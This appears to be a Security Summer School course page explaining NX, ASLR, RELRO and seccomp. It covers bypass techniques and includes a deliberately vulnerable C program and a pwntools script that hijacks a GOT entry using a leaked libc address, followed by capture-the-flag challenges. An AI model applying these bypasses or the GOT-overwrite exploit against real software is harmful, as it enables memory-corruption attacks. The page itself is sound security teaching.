<a id=print href=/binary/_print/><i class="fa fa-print fa-fw"></i> Print entire section</a></div><div class=td-toc><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#tutorials>Tutorials</a><ul><li><a href=#general-defense-mechanisms-check>General Defense Mechanisms Check</a></li><li><a href=#executable-space-protection>Executable Space Protection</a></li><li><a href=#memory-segments-permissions-walkthrough>Memory Segments Permissions Walkthrough</a></li><li><a href=#ways-of-bypassing-nx>Ways of Bypassing NX</a></li><li><a href=#address-space-layout-randomization>Address Space Layout Randomization</a></li><li><a href=#ways-of-bypassing-aslr>Ways of Bypassing ASLR</a></li><li><a href=#chaining-information-leaks-with-got-overwrite>Chaining Information Leaks with GOT Overwrite</a></li><li><a href=#relro>RELRO</a></li><li><a href=#seccomp>seccomp</a></li></ul></li><li><a href=#challenges>Challenges</a><ul><li><a href=#01-04-challenges---rwslotmachine1-4>01-04. Challenges - rwslotmachine[1-4]</a></li><li><a href=#05-bonus---rwslotmachine5>05. Bonus - rwslotmachine5</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li></ul></nav></div></aside><main class="col-12 col-md-9 col-xl-8 pl-md-5" role=main><nav aria-label=breadcrumb class="d-none d-md-block d-print-none"><ol class="breadcrumb spb-1"><li class=breadcrumb-item><a href=/binary/>Binary Exploitation</a></li><li class="breadcrumb-item active" aria-current=page><a href=/binary/defense-mechanisms/>Defense Mechanisms</a></li></ol></nav><div class=td-content><h1></h1><header class=article-meta></header><h1 id=defense-mechanisms>Defense Mechanisms</h1><h2 id=introduction>Introduction</h2><p>The previous sessions (<a href=../shellcodes/>Shellcodes</a> and <a href=../shellcodes-advanced/>Shellcodes Advanced</a>) presented an exploitation scenario that is based on the assumption that machine instructions can be executed from <strong>any</strong> memory segment belonging to the process. As you can recall from the <a href=../executable-file-formats/>Executable File Formats</a> session, different sections of an ELF binary are grouped into segments which are loaded into memory when the binary is being executed. This mechanism (and some hardware support) enables 2 important protection mechanisms that will be presented in this session:</p><ul><li>Executable Space Protection: only certain parts of the address space exhibit the code execution right;</li><li>Address Space Layout Randomization (ASLR): certain parts of the address space get mapped at random locations.</li></ul><p>In the <a href=../return-oriented-prgramming>Return Oriented Programming</a> session we discussed how the <strong>PLT</strong>/<strong>GOT</strong> work in relation to resolving addresses of functions from dynamically liked libraries. We also learned how to abuse this process and trigger arbitrary code execution by <strong>corrupting GOT entries</strong>. We will take this exploit primitive to the next level and explore how it can be used when additional defense mechanisms are in use.</p><p>Next, we will introduce the <strong>RELRO</strong> mitigation, which is designed to preclude the overwriting of relocation sections such as the GOT.</p><p>Another defense mechanism we will discuss is <strong>seccomp</strong>, which enables applications to enforce restrictions on the system calls performed in the process and child processes, thereby creating a sandbox.</p><p>Besides presenting these mechanisms, we are also going to take a quick look at how can we bypass them. Since these protections are ubiquitous at this time, you will have to work around them almost every time you build a binary exploit.</p><p><strong>IMPORTANT:</strong> The tasks today are designed for 32 bit executables. Make sure you compile with the <code>-m32</code> flag for <code>gcc</code>. The binaries in the tasks archive are already compiled as such.</p><h2 id=tutorials>Tutorials</h2><p>The tutorials will showcase the tools used to inspect the defense mechanisms.</p><h3 id=general-defense-mechanisms-check>General Defense Mechanisms Check</h3><p>The <code>checksec</code> command-line tool is a wrapper over the functionality implemented in pwntools' <code>pwnlib.elf.elf</code> module.</p><p>To get it to work in the Kali VM, you have to update pwntools to the latest version using <code>pip3 install -U pwntools</code>.</p><p>We will use this tool throughout the session to identify which defense mechanisms are enabled for a certain binary:</p><pre><code>root@kali:~/demo/nx# checksec ./no_nx
[*] '/root/demo/nx/no_nx'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
</code></pre><h3 id=executable-space-protection>Executable Space Protection</h3><p>The <code>executable space protection</code> is an instance of the <code>principle of least privilege</code>, which is applied in many security sensitive domains. In this case, the executable space protection is used to limit the types of memory access that a process is allowed to make during execution. A memory region (i.e. page) can have the following protection levels: <strong>READ</strong>, <strong>WRITE</strong> and <strong>EXECUTE</strong>. The executable space protection mechanism mandates that writable regions should not be executable at the same time. This prevents code injection.</p><p>The mechanism can be (and was) implemented in many different ways, the most common in Linux being:</p><ul><li><strong>NX bit</strong>: This is the easiest method, and involves an extra bit added to each page table entry that specifies if the memory page should be executable or not. This is the current implementation in 64-bit processors where page table entries are 8-bytes wide.</li><li><strong>Physical Address Extension (PAE)</strong>: Besides the main feature that allows access to more than 4GB of memory, the PAE extension for 32-bit processor also adds a NX bit in its page table entries.</li><li><strong>Emulation</strong>: The NX bit can be emulated on older (i.e., non-PAE) 32-bit processors by overloading the Supervisor bit (<a href=https://en.wikipedia.org/wiki/PaX#PAGEEXEC>PaX PAGEEXEC</a>), or by using the segmentation mechanism and splitting the address space in half (<a href=https://en.wikipedia.org/wiki/PaX#SEGMEXEC>PaX SEGMEXEC</a>).</li></ul><p>This security feature gets in the way of <strong>just-in-time (JIT)</strong> compilers, which need to produce and write code at runtime, and that is later executed. Since a JIT compiler cannot run in this kind of secured environment, an application using it is vulnerable to attacks known as <strong>JIT spraying</strong>. The idea was first presented by Dion Blazakis, and is, briefly, a way to force the JIT compiler to produce shellcode.</p><ul><li>Slides: <a href=http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf>Black Hat & DEF CON 2010</a>;</li><li>Paper: <a href=http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf>Interpreter Exploitation. Pointer Inference and JIT Spraying</a>.</li></ul><p>There are of course other implementations in different hardening-oriented projects such as: OpenBSD <a href="https://marc.info/?l=openbsd-misc&m=105056000801065">W^X</a>, Red Hat <a href="https://marc.info/?l=openbsd-misc&m=105056000801065">Exec Shield</a>, PaX (which is now part of <a href=https://grsecurity.net/>grsecurity</a>), Windows Data Execution Prevention (<a href=https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention>DEP</a>).</p><h3 id=memory-segments-permissions-walkthrough>Memory Segments Permissions Walkthrough</h3><p>The Linux kernel provides support for managing memory protections using the <code>mmap()</code> and <code>mprotect()</code> syscalls. Simply put, what they do is:</p><ul><li><code>mmap()</code>: requests the OS to create a mapping (allocate space) inside the address space of the calling process. See <a href=https://stackoverflow.com/questions/3642021/what-does-mmap-do>this answer</a>;</li><li><code>mprotect()</code>: requests the OS to set permissions over a memory region (e.g. <code>PROT_READ</code>, <code>PROT_WRITE</code>, <code>PROT_EXEC</code> and others).</li></ul><p>These syscalls are used by the loader to set protection levels for each segment it loads when running a binary. Of course, the same functions can also be used during execution.</p><p>PaX has a protection option that restricts the use of <code>mprotect()</code> and <code>mmap()</code> to avoid resetting the permissions during execution. See <a href=https://pax.grsecurity.net/docs/mprotect.txt>MPROTECT</a>. Note that grsecurity/PaX are patches to the kernel, and are not available in normal distributions. You have to compile your own kernel if you want to try them out.</p><p>Let&rsquo;s start by deactivating ASLR, which is going to be discussed in the following section of this tutorial, and only focus on the NX protection. We can do this in two ways, as told below.</p><ul><li>To disable ASLR system-wide we use (root access is required): <code>sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'</code>;</li><li>To create a shell with ASLR disabled (ASLR will also be disabled for future processes spawned from that shell), we use (root access is not required): <code>setarch $(uname -m) -R /bin/bash</code>.</li></ul><p>After disabling ASLR, let&rsquo;s compile an extremely simple C application. Save the following code as <code>hello.c</code>:</p><pre><code>int main() {
    while (1);
}
</code></pre><p>Make sure you have both <code>build-essential</code> and <code>gcc-multilib</code> packages installed before going further (run <code>sudo apt install build-essential gcc-multilib</code> on Debian-based systems).</p><p>Compile the <code>hello.c</code> code using <code>CFLAGS='-m32 -O0' make hello</code>. The result should be a <code>hello</code> binary.</p><p>As presented in the <code>Static Analysis</code> session, the ELF format contains flags for each segment that specify what permissions should be granted. You can use <code>readelf -l hello</code> to dump all program headers for this binary. The result should be similar to:</p><pre><code>Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00568 0x00568 R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x00114 0x00118 RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000490 0x08048490 0x08048490 0x0002c 0x0002c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
   08     .init_array .fini_array .jcr .dynamic .got
</code></pre><p>Check the <code>Flg</code> column. For example, the first <code>LOAD</code> segment contains <code>.text</code> and is marked <code>R E</code>, while the <code>GNU_STACK</code> segment is marked <code>RW </code>.</p><p>Next we are interested in seeing calls to <code>mmap2()</code> and <code>mprotect()</code> made by the loader. We are going to use the <code>strace</code> tool for this, and directly execute the loader. You can check the path to the loader on your system using <code>ldd hello</code>.</p><pre><code>$ strace -e mmap2,mprotect /lib/ld-linux.so.2 ./hello
</code></pre><p>The output should be similar to:</p><pre><code>[ Process PID=11198 runs in 32 bit mode. ]
mmap2(0x8048000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8048000
mmap2(0x8049000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8049000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffc000
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffa000
mmap2(NULL, 156324, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7fd3000
mmap2(NULL, 1763964, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff7e24000
mmap2(0xf7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a9000) = 0xfffffffff7fcd000
mmap2(0xf7fd0000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd0000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7e23000
mprotect(0xf7fcd000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x56575000, 4096, PROT_READ)   = 0
</code></pre><p>We can observe a <code>PROT_READ|PROT_EXEC</code> mapping at address <code>0x8048000</code>, followed by a <code>PROT_READ|PROT_WRITE</code> at address <code>0x8049000</code> that is later changed to <code>PROT_READ</code> for the first half (4096 bytes). The later allocation is the data segment, that should be writable. We can also see a bunch of allocations for segments belonging to dynamic libraries.</p><p>Note that the <strong>stack</strong> is not explicitly allocated by the loader. The kernel will keep increasing it each time a page fault is triggered without calling <code>mmap</code>. Also, the <strong>heap</strong> will be extended on-demand as the application requires it.</p><p>We can dump all memory mappings of the running process as follows:</p><pre><code>$ ps u | grep /lib/ld-linux.so.2 
... # get the PID of the loader process from this output, let's assume it is 11198
$ cat /proc/11198/maps
</code></pre><p>Make sure to use the PID of the loader process, and not the <code>strace</code> process.</p><p>The output of the last <code>cat</code> command should be similar to:</p><pre><code>08048000-08049000 r-xp 00000000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
08049000-0804a000 r--p 00000000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
0804a000-0804b000 rw-p 00001000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
56555000-56575000 r-xp 00000000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so
56575000-56576000 r--p 0001f000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so
56576000-56577000 rw-p 00020000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so
f7e23000-f7e24000 rw-p 00000000 00:00 0 
f7e24000-f7fcd000 r-xp 00000000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so
f7fcd000-f7fcf000 r--p 001a9000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so
f7fcf000-f7fd0000 rw-p 001ab000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so
f7fd0000-f7fd3000 rw-p 00000000 00:00 0 
f7ffa000-f7ffd000 rw-p 00000000 00:00 0 
f7ffd000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
</code></pre><h3 id=ways-of-bypassing-nx>Ways of Bypassing NX</h3><p>Below are a few methods of exploiting a binary that has <strong>NX</strong> enabled:</p><ul><li><strong>ret-to-plt/libc</strong>. You can return to the <code>.plt</code> section and call library function already linked. You can also call other library functions based on their known offsets. The latter approach assumes no ASLR (see next section), or the possibility of an information leak.</li><li><strong>mprotect()</strong>. If the application is using <code>mprotect()</code> you can easily call it to modify the permissions and include <code>PROT_EXEC</code> for the stack. You can also call this in a <code>ret-to-libc</code> attack. You can also <code>mmap</code> a completely new memory region and dump the shellcode there.</li><li><strong>Return Oriented Programming (ROP)</strong>. This is a generalization of the <code>ret-to-*</code> approach that makes use of existing code to execute almost anything. As this is probably one of the most common types of attacks, it will be discussed in depth in a future section.</li></ul><h3 id=address-space-layout-randomization>Address Space Layout Randomization</h3><p><strong>Address Space Layout Randomization (ASLR)</strong> is a security feature that maps different memory regions of an executable at random addresses. This prevents buffer overflow-based attacks that rely on known addresses such as the stack (for calling into shellcode), or dynamically linked libraries (for calling functions that were not already linked with the target binary). Usually, the sections that are randomly mapped are: the stack, the heap, the VDSO page, and the dynamic libraries. The code section can also be randomly mapped for <a href=https://en.wikipedia.org/wiki/Position-independent_code#PIE>PIE</a> binaries.</p><p>Linux allows 3 options for its ASLR implementation that can be configured using the <code>/proc/sys/kernel/randomize_va_space</code> file. Writing <strong>0</strong>, <strong>1</strong> or <strong>2</strong> to this will results in the following behaviors:</p><ul><li><strong>0</strong>: deactivated;</li><li><strong>1</strong>: random stack, vdso, libraries; heap is after code section; random code section (only for PIE-linked binaries);</li><li><strong>2</strong>: random heap too.</li></ul><p>Make sure you reactivate ASLR after the previous section of the tutorial, by one of the two options below.</p><p>If you disabled ASLR system-wide, re-enable it using (root access is required):</p><pre><code>$ sudo bash -c 'echo 2 &gt; /proc/sys/kernel/randomize_va_space'
</code></pre><p>If you disabled ASLR at shell level, simply <strong>close the shell</strong> such as issuing the <code>Ctrl+d</code> keyboard shortcut.</p><p>We can easily demonstrate the effects of ASLR on shared libraries by running <code>ldd</code> multiple times in a row on a binary such as <code>/bin/ls</code>.</p><p>In GDB, ASLR is disabled by default in order to reduce the non-determinism and make debugging easier. However, when developing exploits we will sometimes want to test them in conjunction with ASLR. To enable ASLR in GDB, use the following command:</p><pre><code>pwndbg&gt; set disable-randomization off
</code></pre><h3 id=ways-of-bypassing-aslr>Ways of Bypassing ASLR</h3><p>Below are a few methods of exploiting a binary that has <strong>ASLR</strong> enabled:</p><ul><li><strong>Bruteforce</strong>. If you are able to inject payloads multiple times without crashing the application, you can bruteforce the address you are interested in (e.g., a target in libc). Otherwise, you can just run the exploit multiple times. Another thing to keep in mind is that, as addresses are randomized at load-time, child processes spawned with fork inherit the memory layout of the parent. Take the following scenario: we interact with a vulnerable sever that handles connections by forking to another process. We manage to obtain a leak from a child process but we are not able to create an exploit chain that leads to arbitrary code execution. However, we may still be able to use this leak in another connection, since the new process will have the same address space as the previous.</li><li><strong>NOP sled</strong>. In the case of shellcodes, a longer NOP sled will maximize the chances of jumping inside it and eventually reaching the exploit code even if the stack address is randomized. This is not very useful when we are interested in jumping to libc or other functions, which is usually the case if the executable space protection is also active.</li><li><strong>jmp esp</strong>. This will basically jump into the stack, no matter where it is mapped. It&rsquo;s actually a very rudimentary form of Return Oriented Programming which was discussed in the previous session.</li><li><strong>Restrict entropy</strong>. There are various ways of reducing the entropy of the randomized address. For example, you can decrease the initial stack size by setting a huge amount of dummy environment variables.</li><li><strong>Partial overwrite</strong>. This technique is useful when we are able to overwrite only the least significant byte(s) of an address (e.g. a GOT entry). We must take into account the offsets of the original and final addresses from the beginning of the mapping. If these offsets only differ in the last 8 bits, the exploit is deterministic, as the base of the mapping is aligned to 0x1000. The offsets of <code>read</code> and <code>write</code> in <code>libc6_2.27-3ubuntu1.2_i386</code> are suitable for a partial overwrite:</li></ul><pre><code>pwndbg&gt; p read
$1 = {&lt;text variable, no debug info&gt;} 0xe6dd0 &lt;__GI___libc_read&gt;
pwndbg&gt; p write
$2 = {&lt;text variable, no debug info&gt;} 0xe6ea0 &lt;__GI___libc_write&gt;
</code></pre><p>However, since bits 12-16 of the offsets differ, the corresponding bits in the full addresses would have to be bruteforced (probability 1/4).</p><ul><li><strong>Information leak</strong>. The most effective way of bypassing ASLR is by using an information leak vulnerability that exposes randomized address, or at least parts of them. You can also dump parts of libraries (e.g. <code>libc</code>) if you are able to create an exploit that reads them. This is useful in remote attacks to infer the version of the library, downloading it from the web, and thus knowing the right offsets for other functions (not originally linked with the binary).</li></ul><h3 id=chaining-information-leaks-with-got-overwrite>Chaining Information Leaks with GOT Overwrite</h3><p>In this tutorial we will exploit a program that is similar to the <code>no-ret-control</code> challenge from a previous session:</p><pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
 
int main() {
	int *addr;
 
	printf(&quot;Here's a libc address: 0x%08x\n&quot;, printf);
 
	printf(&quot;Give me and address to modify!\n&quot;);
	scanf(&quot;%p&quot;, &amp;addr);
 
	printf(&quot;Give me a value!\n&quot;);
	scanf(&quot;%u&quot;, addr);
 
	sleep(10);
 
	printf(&quot;Abandon all hope ye who reach this...\n&quot;);	
}
</code></pre><p>The goal is to alter the execution flow and avoid reaching the final <code>printf</code>. To this end, we will overwrite the <code>sleep</code> entry in GOT and redirect it to <code>exit</code>. However, due to ASLR, the value can not be hardcoded and must be computed at runtime.</p><p>Whenever we operate with addresses belonging to shared libraries, we must be aware that the offsets are highly dependent on the particular build of the library. We can identify this build either by its BuildID (retrieved with the file command), or by its version string:</p><pre><code>silvia@imladris:/sss/demo$ ldd ./got_overwrite
    linux-gate.so.1 (0xf7ee8000)
    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ccc000)
    /lib/ld-linux.so.2 (0xf7ee9000)
silvia@imladris:/sss/demo$ file $(realpath /lib/i386-linux-gnu/libc.so.6)
/lib/i386-linux-gnu/libc-2.27.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cf1599aa8b3cb35f79dcaea7a8b48704ecf42a19, for GNU/Linux 3.2.0, stripped
silvia@imladris:/sss/demo$ strings /lib/i386-linux-gnu/libc.so.6 | grep &quot;GLIBC &quot;
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
</code></pre><p>Alternatively, if we don&rsquo;t have prior knowledge of the remote system where the binary runs, but obtain via an information leak some addresses, we may be able to identify the libc based on the last 3 nibbles (a nibble is a group of 4 bits) of these addresses:</p><pre><code>0xf7df6250 &lt;__libc_system&gt;
0xf7e780e0 &lt;__sleep&gt;
</code></pre><p>The least significant 3 nibbles of the above addresses are <code>250</code> and <code>0e0</code>, respectively.</p><p>We enter them in the <a href=https://libc.blukat.me/>libc database</a> and get a match for the same <code>libc</code> build we determined earlier.</p><p>For this <code>libc</code>, we obtain the offsets of the functions we are interested in using GDB:</p><pre><code>silvia@imladris:/sss/demo$ gdb -q -n /lib/i386-linux-gnu/libc.so.6
(gdb) p printf
$1 = {&lt;text variable, no debug info&gt;} 0x513a0 &lt;__printf&gt;
(gdb) p exit
$2 = {&lt;text variable, no debug info&gt;} 0x30420 &lt;__GI_exit&gt;
</code></pre><p>We will also need the address of <code>sleep@got</code> (which is static because the binary is not position independent):</p><pre><code>silvia@imladris:/sss/demo$ objdump -d -M intel -j .plt ./got_overwrite | grep &quot;sleep@plt&quot; -A1
080483b0 &lt;sleep@plt&gt;:
 80483b0:   ff 25 0c a0 04 08       jmp    DWORD PTR ds:0x804a00c
</code></pre><p>We start the program and compute the address of exit based on the leak of printf (in another terminal):</p><pre><code>&gt;&gt;&gt; printf_offset = 0x513a0
&gt;&gt;&gt; exit_offset = 0x30420
&gt;&gt;&gt; 0xf7dfb3a0 - printf_offset + exit_offset
4158497824
</code></pre><pre><code>silvia@imladris:/sss/demo$ ./got_overwrite
Here's a libc address: 0xf7dfb3a0
Give me and address to modify!
0x804a00c
Give me a value!
4158497824
silvia@imladris:/sss/demo$ echo $?
10
</code></pre><p>As we intended, the <code>GOT</code> entry corresponding to <code>sleep</code> was overwritten by exit and the program exited with code 10 without printing the final message.</p><p>The following pwntools script automates this interaction:</p><pre><code>from pwn import *
 
p = process('./got_overwrite')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 
sleep_got = p.elf.got['sleep']
 
p.recvuntil('libc address:')
libc_leak = int(p.recvuntil('\n')[:-1], 16)
libc_base = libc_leak - libc.symbols['printf']
 
print(&quot;Libc base is at: 0x%x&quot; % libc_base)
 
exit = libc_base + libc.symbols['exit']
 
p.sendline(hex(sleep_got))
 
p.recvuntil('value!')
p.sendline(str(exit))
 
p.interactive()
</code></pre><h3 id=relro>RELRO</h3><p><strong>RELRO</strong> (<strong>Rel</strong>ocation <strong>R</strong>ead-<strong>O</strong>nly) defends against attacks which overwrite data in relocation sections, such as the <strong>GOT overwrite</strong> we showed earlier.</p><p>It comes in two flavors:</p><ul><li><strong>Partial</strong>. Protects the <code>.init_array</code>, <code>.fini_array</code>, <code>.dynamic</code> and <code>.got</code> sections (but NOT <code>.got.plt</code>);</li><li><strong>Full</strong>. Additionally protects <code>.got.plt</code>, rendering the <strong>GOT overwrite</strong> attack infeasible.</li></ul><p>In a previous session we explained how the addresses of dynamically linked functions are resolved using lazy binding. When Full RELRO is in effect, the addresses are resolved at load-time and then marked as read-only. Due to the way address space protection works, this means that the <code>.got</code> resides in the read-only mapping, instead of the read-write mapping that contains the <code>.bss</code>.</p><p>This is not a game-over in terms of exploitation, as other overwriteable code pointers often exist. These can be specific to the application we want to exploit or reside in shared libraries (for example: the GOT of shared libraries that are not compiled with RELRO). The return addresses on the stack are still viable targets.</p><h3 id=seccomp>seccomp</h3><p><strong>Seccomp</strong> is a mechanism though which an application may transition into a state where the system calls it performs are restricted. The policy, which may act on a whitelist or blacklist model, is described using <a href=https://lwn.net/Articles/593476/>eBPF</a>.</p><p><strong>Seccomp</strong> filters are instated using the <code>prctl</code> syscall (<code>PR_SET_SECCOMP</code>). Once it is in effect, the application will be effectively sandboxed and the restrictions will be inherited by child processes.</p><p>This may severely limit our exploitation prospects in some cases. In the challenges that we have solved during these sessions, a common goal was spawning a shell and retrieving a certain file (the flag). If the exploited binary used a seccomp filter that disallowed the <code>execve</code> syscall (used by the <code>system</code> library function), this would have thwarted our exploit.</p><p>The <a href=https://github.com/david942j/seccomp-tools>seccomp-tools</a> suite provides tools for analyzing seccomp filters. The <code>dump</code> subcommand may be used to extract the filter from a binary at runtime and display it in a pseudocode format:</p><pre><code>silvia@imladris:/sss/demo$ seccomp-tools dump ./seccomp_example
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
</code></pre><p>In the example above we see a filter operating on the whitelist model: it specifies a subset of syscalls that are allowed: <code>rt_sigreturn</code>, <code>sigreturn</code>, <code>exit_group</code>, <code>exit</code>, <code>open</code>, <code>read</code> and <code>write</code>.</p><p>To install <code>seccomp-tools</code> on the Kali VM, use the the <code>gem</code> package manager:</p><pre><code>$ gem install seccomp-tools
</code></pre><h2 id=challenges>Challenges</h2><p>Challenges can be found in the <code>activities/</code> directory.</p><h3 id=01-04-challenges---rwslotmachine1-4>01-04. Challenges - rwslotmachine[1-4]</h3><p>All of the challenges in this section are intended to be solved with <strong>ASLR enabled</strong>. However, you are free to disable it while developing your exploit for debugging purposes. You are provided with the needed shared libraries from the remote system.</p><p>The challenges are based on the same &ldquo;application&rdquo;: the binaries expose very similar functionality with minimal implementation differences. Your job is to identify the defense mechanisms in use for each of them and bypass them in order to read a flag from the remote system.</p><p>They are numbered in the suggested solving order.</p><p><strong>Tips</strong>:</p><ul><li>Do not waste time on reverse engineering <code>rwslotmachine3</code>! It is very similar to <code>rwslotmachine2</code>, but operates on the client/server model.</li><li>To set <code>LD_LIBRARY_PATH</code> from within a pwntools script, use <code>p = process('./rwslotmachineX', env={'LD_LIBRARY_PATH' : '.'})</code>.</li><li>In the case of <code>rwslotmachine4</code>, you will need the shared library <code>libint.so</code> (found inside of the github repo).</li></ul><h3 id=05-bonus---rwslotmachine5>05. Bonus - rwslotmachine5</h3><p>This challenge is similar to <code>rwslotmachine1</code>. However, your exploit for the first challenge will (most likely) not work. Investigate why and develop a bypass.</p><p><strong>Hint</strong>: You can find a table describing x86 syscalls <a href=https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit>here</a>.</p><h2 id=further-reading>Further Reading</h2><ul><li><a href=https://en.wikipedia.org/wiki/PaX#PAGEEXEC>PaX PAGEEXEC</a></li><li><a href=https://en.wikipedia.org/wiki/PaX#SEGMEXEC>PaX SEGMEXEC</a></li><li><a href=http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf>Black Hat & DEF CON 2010, JIT spraying slides</a>;</li><li><a href=http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf>Interpreter Exploitation. Pointer Inference and JIT Spraying</a>.</li><li><a href=https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention>DEP</a></li><li><a href=https://lwn.net/Articles/593476/>eBPF</a></li></ul><style>.feedback--answer{display:inline-block}.feedback--answer-no{margin-left:1em}.feedback--response{display:none;margin-top:1em}.feedback--response__visible{display:block}</style><div class=d-print-none><h2 class=feedback--title>Feedback</h2><p class=feedback--question>Was this page helpful?</p><button class="btn btn-primary mb-4 feedback--answer feedback--answer-yes">Yes</button>
<button class="btn btn-primary mb-4 feedback--answer feedback--answer-no">No</button><p class="feedback--response feedback--response-yes">Glad to hear it! Please <a href=https://github.com/security-summer-school/security-summer-school.github.io/issues/new>tell us how we can improve</a>.</p><p class="feedback--response feedback--response-no">Sorry to hear that. Please <a href=https://github.com/security-summer-school/security-summer-school.github.io/issues/new>tell us how we can improve</a>.</p></div><script>const yesButton=document.querySelector('.feedback--answer-yes'),noButton=document.querySelector('.feedback--answer-no'),yesResponse=document.querySelector('.feedback--response-yes'),noResponse=document.querySelector('.feedback--response-no'),disableButtons=()=>{yesButton.disabled=!0,noButton.disabled=!0},sendFeedback=b=>{if(typeof ga!='function')return;const a={command:'send',hitType:'event',category:'Helpful',action:'click',label:window.location.pathname,value:b};ga(a.command,a.hitType,a.category,a.action,a.label,a.value)};yesButton.addEventListener('click',()=>{yesResponse.classList.add('feedback--response__visible'),disableButtons(),sendFeedback(1)}),noButton.addEventListener('click',()=>{noResponse.classList.add('feedback--response__visible'),disableButtons(),sendFeedback(0)})</script><br><div class="text-muted mt-5 pt-3 border-top"></div></div></main></div></div><footer class="bg-dark py-5 row d-print-none"><div class="container-fluid mx-sm-5"><div class=row><div class="col-6 col-sm-4 text-xs-center order-sm-2"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Discord aria-label=Discord><a class=text-white target=_blank rel=noopener href=https://bit.ly/DiscordSecuritySummerSchool aria-label=Discord><i class="fab fa-discord"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Facebook aria-label=Facebook><a class=text-white target=_blank rel=noopener href=https://www.facebook.com/SSSUPB/ aria-label=Facebook><i class="fab fa-facebook"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Youtube aria-label=Youtube><a class=text-white target=_blank rel=noopener href=https://bit.ly/YoutubeSecuritySummerSchool aria-label=Youtube><i 